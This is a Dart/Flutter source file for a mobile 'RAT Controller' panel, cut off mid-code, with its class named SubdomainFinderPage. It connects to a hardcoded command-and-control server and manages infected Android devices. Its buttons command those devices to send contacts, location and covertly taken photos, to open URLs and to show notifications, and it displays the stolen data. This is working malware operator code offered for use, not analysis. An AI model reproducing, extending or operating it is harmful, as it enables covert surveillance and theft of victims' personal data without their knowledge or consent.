// Controller RAT by Void production - Red Theme Version

import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'package:flutter/services.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'dart:async';
import 'dart:math';

class SubdomainFinderPage extends StatefulWidget {
  final String sessionKey;

  const SubdomainFinderPage({super.key, required this.sessionKey});

  @override
  State<SubdomainFinderPage> createState() => _SubdomainFinderPageState();
}

class _SubdomainFinderPageState extends State<SubdomainFinderPage> with SingleTickerProviderStateMixin {
  // ========== C2 PANEL VARIABLES ==========
  late TabController _tabController;
  
  // WebSocket connection
  WebSocketChannel? _channel;
  bool _isConnected = false;
  String _connectionStatus = 'Disconnected';
  
  // Data devices
  List<Map<String, dynamic>> _devices = [];
  List<Map<String, dynamic>> _contacts = [];
  List<Map<String, dynamic>> _locations = [];
  List<Map<String, dynamic>> _photos = [];
  
  // Command state
  bool _isSendingCommand = false;
  
  // Timer untuk auto refresh
  Timer? _refreshTimer;
  
  // Loading states
  bool _isLoadingDevices = false;

  // ========== RED THEME CONSTANTS ==========
  static const Color primaryRed = Color(0xFFEF4444);      // Bright red utama
  static const Color accentRed = Color(0xFFDC2626);        // Darker red untuk accent
  static const Color lightRed = Color(0xFFFCA5A5);         // Light red untuk secondary
  static const Color darkBg = Color(0xFF0A0A0A);           // Background hitam pekat
  static const Color cardBg = Color(0xFF1A1A1A);           // Card background
  static const Color inputBg = Color(0xFF2A2A2A);          // Input background
  
  // Server URLs - PAKAI DOMAIN DARI SERVER!
  static const String c2ServerUrl = 'ws://ntfserverr.sistems.tech:4240';
  static const String c2HttpUrl = 'http://ntfserverr.sistems.tech:4240';

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 4, vsync: this);
    _connectToC2Server();
  }

  // ========== KONEKSI KE C2 SERVER ==========
  void _connectToC2Server() {
    setState(() {
      _connectionStatus = 'Connecting...';
    });
    
    try {
      _channel = WebSocketChannel.connect(
        Uri.parse(c2ServerUrl),
      );
      
      _channel!.stream.listen((message) {
        _handleC2Message(message);
      }, onError: (error) {
        setState(() {
          _isConnected = false;
          _connectionStatus = 'Connection Error';
        });
        _showSnackBar('C2 Server connection error: $error', isError: true);
        
        Future.delayed(const Duration(seconds: 5), () {
          if (!_isConnected) {
            _connectToC2Server();
          }
        });
      }, onDone: () {
        setState(() {
          _isConnected = false;
          _connectionStatus = 'Disconnected';
        });
        
        Future.delayed(const Duration(seconds: 5), () {
          _connectToC2Server();
        });
      });
      
      _channel!.sink.add(jsonEncode({
        'type': 'auth',
        'session_key': widget.sessionKey,
        'timestamp': DateTime.now().toIso8601String(),
      }));
      
      setState(() {
        _isConnected = true;
        _connectionStatus = 'Connected';
      });
      
      _showSnackBar('Connected to C2 Server');
      _fetchDevices();
      
      _refreshTimer = Timer.periodic(const Duration(seconds: 30), (timer) {
        if (_isConnected) {
          _fetchDevices();
        }
      });
      
    } catch (e) {
      setState(() {
        _isConnected = false;
        _connectionStatus = 'Connection Failed';
      });
      _showSnackBar('Failed to connect to C2 Server: $e', isError: true);
      
      Future.delayed(const Duration(seconds: 5), () {
        _connectToC2Server();
      });
    }
  }

  void _handleC2Message(String message) {
    try {
      final data = jsonDecode(message);
      print('Received: $data');
      
      switch (data['type']) {
        case 'device_list':
        case 'devices':
          setState(() {
            _devices = List<Map<String, dynamic>>.from(data['devices'] ?? data['data'] ?? []);
          });
          break;
          
        case 'new_device':
        case 'device_connected':
          setState(() {
            _devices.add(data['device'] ?? data['data']);
          });
          _showSnackBar('📱 New device connected: ${_getDeviceModel(data['device'])}');
          break;
          
        case 'device_disconnected':
          setState(() {
            _devices.removeWhere((d) => d['id'] == data['device_id']);
          });
          _showSnackBar('📱 Device disconnected');
          break;
          
        case 'contacts_data':
        case 'contacts':
          setState(() {
            _contacts.add({
              'device_id': data['device_id'],
              'device_name': _getDeviceModelById(data['device_id']),
              'timestamp': DateTime.now(),
              'data': data['data'] ?? data['contacts'] ?? [],
              'count': data['count'] ?? (data['data']?.length ?? 0),
            });
          });
          _showSnackBar('📞 Contacts received from ${_getDeviceModelById(data['device_id'])}');
          break;
          
        case 'location_data':
        case 'location':
          setState(() {
            _locations.add({
              'device_id': data['device_id'],
              'device_name': _getDeviceModelById(data['device_id']),
              'timestamp': DateTime.now(),
              'lat': data['lat'] ?? data['latitude'],
              'lng': data['lng'] ?? data['longitude'],
              'accuracy': data['accuracy'] ?? 0,
            });
          });
          break;
          
        case 'photo_data':
        case 'photo':
          setState(() {
            _photos.add({
              'device_id': data['device_id'],
              'device_name': _getDeviceModelById(data['device_id']),
              'timestamp': DateTime.now(),
              'image': data['image'] ?? data['photo'],
            });
          });
          _showSnackBar('📸 Photo received from ${_getDeviceModelById(data['device_id'])}');
          break;
          
        case 'command_status':
        case 'status':
          _showSnackBar('${data['message'] ?? 'Command ${data['status']}'}');
          break;
          
        default:
          print('Unknown message type: ${data['type']}');
      }
    } catch (e) {
      print('Error handling message: $e');
    }
  }

  Future<void> _fetchDevices() async {
    if (!_isConnected) return;
    
    setState(() => _isLoadingDevices = true);
    
    try {
      _channel!.sink.add(jsonEncode({
        'type': 'get_devices',
        'timestamp': DateTime.now().toIso8601String(),
      }));
      
      try {
        final response = await http.get(Uri.parse('$c2HttpUrl/api/devices?key=${widget.sessionKey}'));
        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          if (data['status'] == true) {
            setState(() {
              _devices = List<Map<String, dynamic>>.from(data['devices'] ?? []);
            });
          }
        }
      } catch (e) {
        print('HTTP fetch error: $e');
      }
      
    } catch (e) {
      print('Error fetching devices: $e');
    } finally {
      setState(() => _isLoadingDevices = false);
    }
  }

  void _sendCommand(String deviceId, String command, [Map<String, dynamic>? params]) {
    if (!_isConnected) {
      _showSnackBar('Not connected to C2 server', isError: true);
      return;
    }
    
    setState(() => _isSendingCommand = true);
    
    final commandData = {
      'type': 'command',
      'device_id': deviceId,
      'command': command,
      'params': params ?? {},
      'timestamp': DateTime.now().toIso8601String(),
    };
    
    _channel!.sink.add(jsonEncode(commandData));
    _showSnackBar('📤 Command sent to ${_getDeviceModelById(deviceId)}');
    
    setState(() => _isSendingCommand = false);
  }

  void _showSnackBar(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(message),
      backgroundColor: isError ? accentRed : primaryRed,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
      duration: const Duration(seconds: 2),
    ));
  }

  String _getDeviceModel(Map<String, dynamic>? device) {
    if (device == null) return 'Unknown';
    return device['model'] ?? device['device_model'] ?? 'Android Device';
  }

  String _getDeviceModelById(String deviceId) {
    final device = _devices.firstWhere(
      (d) => d['id'] == deviceId || d['device_id'] == deviceId,
      orElse: () => {'model': 'Unknown Device'},
    );
    return device['model'] ?? device['device_model'] ?? 'Unknown Device';
  }

  String _formatTime(DateTime time) {
    final now = DateTime.now();
    final difference = now.difference(time);
    
    if (difference.inMinutes < 1) return 'Just now';
    if (difference.inHours < 1) return '${difference.inMinutes}m ago';
    if (difference.inDays < 1) return '${difference.inHours}h ago';
    return '${difference.inDays}d ago';
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      appBar: AppBar(
        backgroundColor: cardBg,
        elevation: 0,
        title: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(8),
              decoration: BoxDecoration(
                color: primaryRed.withOpacity(0.15),
                borderRadius: BorderRadius.circular(8),
                boxShadow: [
                  BoxShadow(
                    color: primaryRed.withOpacity(0.3),
                    blurRadius: 8,
                  ),
                ],
              ),
              child: const Icon(Icons.security, color: primaryRed, size: 24),
            ),
            const SizedBox(width: 10),
            const Text(
              'RAT CONTROLLER',
              style: TextStyle(
                color: primaryRed,
                fontWeight: FontWeight.bold,
                fontSize: 18,
                letterSpacing: 1,
              ),
            ),
          ],
        ),
        actions: [
          Container(
            margin: const EdgeInsets.only(right: 8),
            padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 6),
            decoration: BoxDecoration(
              color: _isConnected ? primaryRed.withOpacity(0.15) : accentRed.withOpacity(0.15),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: _isConnected ? primaryRed : accentRed,
                width: 1,
              ),
            ),
            child: Row(
              mainAxisSize: MainAxisSize.min,
              children: [
                Container(
                  width: 8,
                  height: 8,
                  decoration: BoxDecoration(
                    color: _isConnected ? primaryRed : accentRed,
                    shape: BoxShape.circle,
                    boxShadow: [
                      BoxShadow(
                        color: _isConnected ? primaryRed : accentRed,
                        blurRadius: 4,
                      ),
                    ],
                  ),
                ),
                const SizedBox(width: 6),
                Text(
                  _connectionStatus,
                  style: TextStyle(
                    color: _isConnected ? primaryRed : accentRed,
                    fontSize: 12,
                    fontWeight: FontWeight.bold,
                  ),
                ),
              ],
            ),
          ),
          IconButton(
            icon: const Icon(Icons.refresh, color: primaryRed),
            onPressed: _fetchDevices,
            tooltip: 'Refresh',
          ),
        ],
        bottom: TabBar(
          controller: _tabController,
          indicatorColor: primaryRed,
          labelColor: primaryRed,
          unselectedLabelColor: Colors.white54,
          tabs: const [
            Tab(icon: Icon(Icons.dashboard), text: 'DASHBOARD'),
            Tab(icon: Icon(Icons.phone_android), text: 'DEVICES'),
            Tab(icon: Icon(Icons.data_usage), text: 'DATA'),
            Tab(icon: Icon(Icons.settings), text: 'SETTINGS'),
          ],
        ),
      ),
      body: TabBarView(
        controller: _tabController,
        children: [
          _buildDashboardTab(),
          _buildDevicesTab(),
          _buildDataTab(),
          _buildSettingsTab(),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        backgroundColor: primaryRed,
        child: const Icon(Icons.add, color: Colors.white),
        onPressed: () {
          _tabController.animateTo(1);
        },
      ),
    );
  }

  Widget _buildDashboardTab() {
    int onlineCount = _devices.where((d) => 
      d['status'] == 'online' || d['isOnline'] == true || d['connected'] == true
    ).length;
    int totalDevices = _devices.length;
    int totalData = _contacts.length + _locations.length + _photos.length;
    
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          GridView.count(
            shrinkWrap: true,
            physics: const NeverScrollableScrollPhysics(),
            crossAxisCount: 2,
            crossAxisSpacing: 12,
            mainAxisSpacing: 12,
            childAspectRatio: 1.5,
            children: [
              _buildStatCard('TOTAL DEVICES', totalDevices.toString(), Icons.devices, primaryRed),
              _buildStatCard('ONLINE', onlineCount.toString(), Icons.wifi, primaryRed),
              _buildStatCard('OFFLINE', (totalDevices - onlineCount).toString(), Icons.wifi_off, accentRed),
              _buildStatCard('DATA COLLECTED', totalData.toString(), Icons.storage, lightRed),
            ],
          ),
          
          const SizedBox(height: 24),
          
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: primaryRed.withOpacity(0.2)),
              boxShadow: [
                BoxShadow(
                  color: primaryRed.withOpacity(0.1),
                  blurRadius: 10,
                ),
              ],
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.flash_on, color: primaryRed, size: 20),
                    const SizedBox(width: 8),
                    Text('QUICK ACTIONS', style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold)),
                  ],
                ),
                const SizedBox(height: 16),
                Wrap(
                  spacing: 8,
                  runSpacing: 8,
                  children: [
                    _buildActionButton('Get All Contacts', Icons.contacts, () {
                      for (var device in _devices) {
                        _sendCommand(device['id'] ?? device['device_id'], 'get_contacts');
                      }
                    }),
                    _buildActionButton('Get All Locations', Icons.location_on, () {
                      for (var device in _devices) {
                        _sendCommand(device['id'] ?? device['device_id'], 'get_location');
                      }
                    }),
                    _buildActionButton('Take All Photos', Icons.camera_alt, () {
                      for (var device in _devices) {
                        _sendCommand(device['id'] ?? device['device_id'], 'take_photo');
                      }
                    }),
                  ],
                ),
              ],
            ),
          ),
          
          const SizedBox(height: 24),
          
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: cardBg,
              borderRadius: BorderRadius.circular(12),
              border: Border.all(color: primaryRed.withOpacity(0.2)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  children: [
                    Icon(Icons.history, color: primaryRed, size: 20),
                    const SizedBox(width: 8),
                    Text('RECENT ACTIVITY', style: TextStyle(color: primaryRed, fontWeight: FontWeight.bold)),
                  ],
                ),
                const SizedBox(height: 16),
                _buildRecentActivityList(),
              ],
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildStatCard(String label, String value, IconData icon, Color color) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: cardBg,
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: color.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(
            color: color.withOpacity(0.1),
            blurRadius: 8,
          ),
        ],
      ),
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(icon, color: color, size: 28),
          const SizedBox(height: 8),
          Text(value, style: TextStyle(fontSize: 24, fontWeight: FontWeight.bold, color: color)),
          Text(label, style: const TextStyle(color: Colors.white54, fontSize: 11), textAlign: TextAlign.center),
        ],
      ),
    );
  }

  Widget _buildActionButton(String label, IconData icon, VoidCallback onPressed) {
    return ElevatedButton.icon(
      onPressed: onPressed,
      icon: Icon(icon, size: 16),
      label: Text(label, style: const TextStyle(fontSize: 12)),
      style: ElevatedButton.styleFrom(
        backgroundColor: primaryRed.withOpacity(0.1),
        foregroundColor: primaryRed,
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(20),
          side: BorderSide(color: primaryRed.withOpacity(0.3)),
        ),
      ),
    );
  }

  Widget _buildRecentActivityList() {
    List<Widget> activities = [];
    
    for (var contact in _contacts.take(3)) {
      activities.add(_buildActivityItem(
        icon: Icons.contacts,
        title: '📞 Contacts from ${contact['device_name']}',
        subtitle: '${contact['count']} contacts received',
        time: contact['timestamp'],
      ));
    }
    
    for (var location in _locations.take(3)) {
      activities.add(_buildActivityItem(
        icon: Icons.location_on,
        title: '📍 Location from ${location['device_name']}',
        subtitle: '${location['lat']}, ${location['lng']}',
        time: location['timestamp'],
      ));
    }
    
    for (var photo in _photos.take(3)) {
      activities.add(_buildActivityItem(
        icon: Icons.photo,
        title: '📸 Photo from ${photo['device_name']}',
        subtitle: 'New image captured',
        time: photo['timestamp'],
      ));
    }
    
    if (activities.isEmpty) {
      return const Center(child: Padding(
        padding: EdgeInsets.all(32),
        child: Text('No activity yet', style: TextStyle(color: Colors.white54)),
      ));
    }
    
    return Column(children: activities);
  }

  Widget _buildActivityItem({
    required IconData icon,
    required String title,
    required String subtitle,
    required DateTime time,
  }) {
    return Container(
      margin: const EdgeInsets.only(bottom: 12),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.white.withOpacity(0.05),
        borderRadius: BorderRadius.circular(8),
        border: Border.all(color: primaryRed.withOpacity(0.1)),
      ),
      child: Row(
        children: [
          Container(
            padding: const EdgeInsets.all(8),
            decoration: BoxDecoration(
              color: primaryRed.withOpacity(0.1),
              borderRadius: BorderRadius.circular(8),
            ),
            child: Icon(icon, color: primaryRed, size: 16),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(title, style: const TextStyle(color: Colors.white, fontSize: 13)),
                const SizedBox(height: 4),
                Text(subtitle, style: const TextStyle(color: Colors.white54, fontSize: 11)),
              ],
            ),
          ),
          Text(_formatTime(time), style: const TextStyle(color: Colors.white38, fontSize: 10)),
        ],
      ),
    );
  }

  Widget _buildDevicesTab() {
    if (_isLoadingDevices) {
      return const Center(child: CircularProgressIndicator(color: primaryRed));
    }
    
    if (_devices.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.phonelink_off, color: Colors.white24, size: 64),
            const SizedBox(height: 16),
            const Text('No devices connected', style: TextStyle(color: Colors.white54, fontSize: 16)),
            const SizedBox(height: 8),
            Text('Waiting for payloads to connect...', style: TextStyle(color: Colors.white38, fontSize: 14)),
          ],
        ),
      );
    }
    
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _devices.length,
      itemBuilder: (context, index) {
        final device = _devices[index];
        final deviceId = device['id'] ?? device['device_id'] ?? 'unknown';
        final isOnline = device['status'] == 'online' || device['isOnline'] == true || device['connected'] == true;
        final model = device['model'] ?? device['device_model'] ?? 'Android Device';
        final brand = device['brand'] ?? device['manufacturer'] ?? 'Unknown';
        final androidVer = device['android_version'] ?? device['os_version'] ?? 'Unknown';
        
        return Container(
          margin: const EdgeInsets.only(bottom: 12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: isOnline ? primaryRed.withOpacity(0.5) : accentRed.withOpacity(0.3), width: 1.5),
          ),
          child: Column(
            children: [
              ListTile(
                leading: CircleAvatar(
                  backgroundColor: isOnline ? primaryRed.withOpacity(0.2) : accentRed.withOpacity(0.2),
                  child: Icon(Icons.phone_android, color: isOnline ? primaryRed : accentRed),
                ),
                title: Text(model, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                subtitle: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text('$brand • Android $androidVer', style: const TextStyle(color: Colors.white54, fontSize: 12)),
                    Text('ID: ${deviceId.substring(0, min(8, deviceId.length))}...', style: const TextStyle(color: Colors.white38, fontSize: 10)),
                  ],
                ),
                trailing: Container(
                  padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                  decoration: BoxDecoration(
                    color: isOnline ? primaryRed.withOpacity(0.2) : accentRed.withOpacity(0.2),
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Text(
                    isOnline ? 'ONLINE' : 'OFFLINE',
                    style: TextStyle(color: isOnline ? primaryRed : accentRed, fontSize: 10, fontWeight: FontWeight.bold),
                  ),
                ),
              ),
              Padding(
                padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                  children: [
                    _buildCommandButton(icon: Icons.contacts, label: 'Contacts', onPressed: isOnline ? () => _sendCommand(deviceId, 'get_contacts') : null),
                    _buildCommandButton(icon: Icons.location_on, label: 'Location', onPressed: isOnline ? () => _sendCommand(deviceId, 'get_location') : null),
                    _buildCommandButton(icon: Icons.camera_alt, label: 'Photo', onPressed: isOnline ? () => _sendCommand(deviceId, 'take_photo') : null),
                    _buildCommandButton(icon: Icons.more_horiz, label: 'More', onPressed: isOnline ? () => _showDeviceCommands(deviceId, model) : null),
                  ],
                ),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildCommandButton({required IconData icon, required String label, required VoidCallback? onPressed}) {
    final isEnabled = onPressed != null;
    
    return Expanded(
      child: InkWell(
        onTap: onPressed,
        child: Container(
          padding: const EdgeInsets.symmetric(vertical: 8),
          decoration: BoxDecoration(
            color: isEnabled ? primaryRed.withOpacity(0.1) : Colors.transparent,
            borderRadius: BorderRadius.circular(6),
          ),
          child: Column(
            children: [
              Icon(icon, color: isEnabled ? primaryRed : Colors.white24, size: 18),
              const SizedBox(height: 2),
              Text(label, style: TextStyle(color: isEnabled ? primaryRed : Colors.white24, fontSize: 10)),
            ],
          ),
        ),
      ),
    );
  }

  void _showDeviceCommands(String deviceId, String deviceName) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      builder: (context) => Container(
        decoration: BoxDecoration(
          color: cardBg,
          borderRadius: const BorderRadius.vertical(top: Radius.circular(20)),
          border: Border.all(color: primaryRed.withOpacity(0.3)),
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(margin: const EdgeInsets.only(top: 12), width: 40, height: 4, decoration: BoxDecoration(color: primaryRed.withOpacity(0.5), borderRadius: BorderRadius.circular(2))),
            const SizedBox(height: 16),
            ListTile(
              leading: CircleAvatar(backgroundColor: primaryRed.withOpacity(0.1), child: Icon(Icons.phone_android, color: primaryRed)),
              title: Text(deviceName, style: const TextStyle(color: Colors.white)),
              subtitle: Text('ID: $deviceId', style: const TextStyle(color: Colors.white54, fontSize: 12)),
            ),
            const Divider(color: Colors.white24),
            _buildCommandTile(Icons.contacts, 'Get Contacts', () { Navigator.pop(context); _sendCommand(deviceId, 'get_contacts'); }),
            _buildCommandTile(Icons.location_on, 'Get Location', () { Navigator.pop(context); _sendCommand(deviceId, 'get_location'); }),
            _buildCommandTile(Icons.camera_alt, 'Take Photo', () { Navigator.pop(context); _sendCommand(deviceId, 'take_photo'); }),
            _buildCommandTile(Icons.link, 'Open URL', () { Navigator.pop(context); _showUrlDialog(deviceId); }),
            _buildCommandTile(Icons.notifications, 'Send Notification', () { Navigator.pop(context); _showNotificationDialog(deviceId); }),
            const SizedBox(height: 20),
          ],
        ),
      ),
    );
  }

  Widget _buildCommandTile(IconData icon, String label, VoidCallback onTap) {
    return ListTile(
      leading: Icon(icon, color: primaryRed),
      title: Text(label, style: const TextStyle(color: Colors.white)),
      onTap: onTap,
    );
  }

  void _showUrlDialog(String deviceId) {
    final urlController = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: primaryRed.withOpacity(0.3))),
        title: const Text('Open URL', style: TextStyle(color: Colors.white)),
        content: TextField(
          controller: urlController,
          style: const TextStyle(color: Colors.white),
          decoration: InputDecoration(
            hintText: 'https://example.com',
            hintStyle: const TextStyle(color: Colors.white38),
            enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: primaryRed.withOpacity(0.3))),
            focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: primaryRed)),
          ),
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: Colors.white70))),
          ElevatedButton(
            onPressed: () { Navigator.pop(context); _sendCommand(deviceId, 'open_url', {'url': urlController.text}); },
            style: ElevatedButton.styleFrom(backgroundColor: primaryRed, foregroundColor: Colors.white),
            child: const Text('Send'),
          ),
        ],
      ),
    );
  }

  void _showNotificationDialog(String deviceId) {
    final titleController = TextEditingController();
    final bodyController = TextEditingController();
    
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        backgroundColor: cardBg,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16), side: BorderSide(color: primaryRed.withOpacity(0.3))),
        title: const Text('Send Notification', style: TextStyle(color: Colors.white)),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            TextField(
              controller: titleController,
              style: const TextStyle(color: Colors.white),
              decoration: InputDecoration(
                labelText: 'Title',
                labelStyle: TextStyle(color: primaryRed),
                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: primaryRed.withOpacity(0.3))),
                focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: primaryRed)),
              ),
            ),
            const SizedBox(height: 12),
            TextField(
              controller: bodyController,
              style: const TextStyle(color: Colors.white),
              maxLines: 3,
              decoration: InputDecoration(
                labelText: 'Message',
                labelStyle: TextStyle(color: primaryRed),
                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: primaryRed.withOpacity(0.3))),
                focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: primaryRed)),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text('Cancel', style: TextStyle(color: Colors.white70))),
          ElevatedButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand(deviceId, 'send_notification', {'title': titleController.text, 'body': bodyController.text});
            },
            style: ElevatedButton.styleFrom(backgroundColor: primaryRed, foregroundColor: Colors.white),
            child: const Text('Send'),
          ),
        ],
      ),
    );
  }

  Widget _buildDataTab() {
    return Column(
      children: [
        Container(
          color: cardBg,
          child: TabBar(
            tabs: const [
              Tab(text: 'CONTACTS', icon: Icon(Icons.contacts)),
              Tab(text: 'LOCATIONS', icon: Icon(Icons.location_on)),
              Tab(text: 'PHOTOS', icon: Icon(Icons.photo)),
            ],
            indicatorColor: primaryRed,
            labelColor: primaryRed,
            unselectedLabelColor: Colors.white54,
          ),
        ),
        Expanded(
          child: TabBarView(
            children: [
              _buildContactsView(),
              _buildLocationsView(),
              _buildPhotosView(),
            ],
          ),
        ),
      ],
    );
  }

  Widget _buildContactsView() {
    if (_contacts.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.contacts, color: Colors.white24, size: 64),
            const SizedBox(height: 16),
            const Text('No contacts data', style: TextStyle(color: Colors.white54)),
          ],
        ),
      );
    }
    
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _contacts.length,
      itemBuilder: (context, index) {
        final contact = _contacts[index];
        final data = contact['data'] as List;
        
        return Container(
          margin: const EdgeInsets.only(bottom: 12),
          padding: const EdgeInsets.all(16),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: primaryRed.withOpacity(0.2)),
          ),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Row(
                children: [
                  CircleAvatar(radius: 16, backgroundColor: primaryRed.withOpacity(0.1), child: Text(data.length.toString(), style: const TextStyle(color: primaryRed, fontSize: 12))),
                  const SizedBox(width: 12),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(contact['device_name'] ?? 'Unknown Device', style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
                        Text(_formatTime(contact['timestamp']), style: const TextStyle(color: Colors.white54, fontSize: 11)),
                      ],
                    ),
                  ),
                  IconButton(
                    icon: Icon(Icons.copy_all, color: primaryRed, size: 20),
                    onPressed: () {
                      final jsonStr = jsonEncode(data);
                      Clipboard.setData(ClipboardData(text: jsonStr));
                      _showSnackBar('Contacts copied to clipboard');
                    },
                  ),
                ],
              ),
              const SizedBox(height: 12),
              ...data.take(5).map((c) => Padding(
                padding: const EdgeInsets.symmetric(vertical: 4),
                child: Row(
                  children: [
                    Expanded(flex: 2, child: Text(c['name'] ?? 'No Name', style: const TextStyle(color: Colors.white70, fontSize: 13))),
                    Expanded(flex: 3, child: Text((c['phones'] as List?)?.join(', ') ?? 'No Number', style: const TextStyle(color: Colors.white38, fontSize: 12), overflow: TextOverflow.ellipsis)),
                  ],
                ),
              )),
              if (data.length > 5) Padding(
                padding: const EdgeInsets.only(top: 8),
                child: Text('... and ${data.length - 5} more', style: const TextStyle(color: Colors.white38, fontSize: 12)),
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildLocationsView() {
    if (_locations.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.location_off, color: Colors.white24, size: 64),
            const SizedBox(height: 16),
            const Text('No location data', style: TextStyle(color: Colors.white54)),
          ],
        ),
      );
    }
    
    return ListView.builder(
      padding: const EdgeInsets.all(16),
      itemCount: _locations.length,
      itemBuilder: (context, index) {
        final location = _locations[index];
        
        return Container(
          margin: const EdgeInsets.only(bottom: 8),
          padding: const EdgeInsets.all(12),
          decoration: BoxDecoration(
            color: cardBg,
            borderRadius: BorderRadius.circular(12),
            border: Border.all(color: primaryRed.withOpacity(0.2)),
          ),
          child: Row(
            children: [
              Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: primaryRed.withOpacity(0.1), borderRadius: BorderRadius.circular(8)), child: const Icon(Icons.location_on, color: primaryRed, size: 20)),
              const SizedBox(width: 12),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(location['device_name'] ?? 'Unknown', style: const TextStyle(color: Colors.white70, fontSize: 12)),
                    const SizedBox(height: 4),
                    Text('${location['lat']?.toStringAsFixed(6)}, ${location['lng']?.toStringAsFixed(6)}', style: const TextStyle(color: Colors.white)),
                    Text('Accuracy: ${location['accuracy']}m • ${_formatTime(location['timestamp'])}', style: const TextStyle(color: Colors.white38, fontSize: 11)),
                  ],
                ),
              ),
              IconButton(
                icon: Icon(Icons.open_in_new, color: primaryRed, size: 20),
                onPressed: () {
                  final url = 'https://www.google.com/maps?q=${location['lat']},${location['lng']}';
                  // Buka URL di browser nanti
                },
              ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildPhotosView() {
    if (_photos.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.photo_library, color: Colors.white24, size: 64),
            const SizedBox(height: 16),
            const Text('No photos', style: TextStyle(color: Colors.white54)),
          ],
        ),
      );
    }
    
    return GridView.builder(
      padding: const EdgeInsets.all(16),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(crossAxisCount: 2, crossAxisSpacing: 8, mainAxisSpacing: 8, childAspectRatio: 1),
      itemCount: _photos.length,
      itemBuilder: (context, index) {
        final photo = _photos[index];
        
        return GestureDetector(
          onTap: () {
            showDialog(
              context: context,
              builder: (context) => Dialog(
                backgroundColor: Colors.transparent,
                child: Stack(
                  children: [
                    ClipRRect(
                      borderRadius: BorderRadius.circular(16),
                      child: Image.memory(base64Decode(photo['image']), fit: BoxFit.contain),
                    ),
                    Positioned(
                      top: 20, right: 20,
                      child: IconButton(
                        icon: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: Colors.black54, shape: BoxShape.circle), child: const Icon(Icons.close, color: Colors.white)),
